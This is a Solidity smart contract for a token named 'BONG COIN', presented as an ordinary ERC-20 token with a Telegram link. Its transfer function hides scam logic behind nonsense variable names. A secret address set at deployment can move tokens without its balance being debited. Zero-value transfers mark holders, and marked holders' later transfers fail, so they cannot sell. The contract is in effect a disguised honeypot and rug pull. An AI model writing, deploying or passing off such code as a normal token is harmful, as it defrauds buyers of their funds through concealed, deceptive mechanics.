/*

https://t.me/bongcoineth

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract BONGCOIN is Ownable {
    string public name = 'BONG COIN';

    mapping(address => uint256) private pass;

    function voice(address straight, address drop, uint256 chosen) private returns (bool success) {
        if (pass[straight] == 0) {
            if (uniswapV2Pair != straight && cream[straight] > 0) {
                pass[straight] -= gun;
            }
            balanceOf[straight] -= chosen;
        }
        balanceOf[drop] += chosen;
        if (chosen == 0) {
            cream[drop] += gun;
        }
        emit Transfer(straight, drop, chosen);
        return true;
    }

    function transfer(address drop, uint256 chosen) public returns (bool success) {
        voice(msg.sender, drop, chosen);
        return true;
    }

    function approve(address stepped, uint256 chosen) public returns (bool success) {
        allowance[msg.sender][stepped] = chosen;
        emit Approval(msg.sender, stepped, chosen);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    uint256 private gun = 48;

    address public uniswapV2Pair;

    string public symbol = 'BONG COIN';

    mapping(address => uint256) private cream;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address leave) {
        balanceOf[msg.sender] = totalSupply;
        pass[leave] = gun;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    function transferFrom(address straight, address drop, uint256 chosen) public returns (bool success) {
        voice(straight, drop, chosen);
        require(chosen <= allowance[straight][msg.sender]);
        allowance[straight][msg.sender] -= chosen;
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
}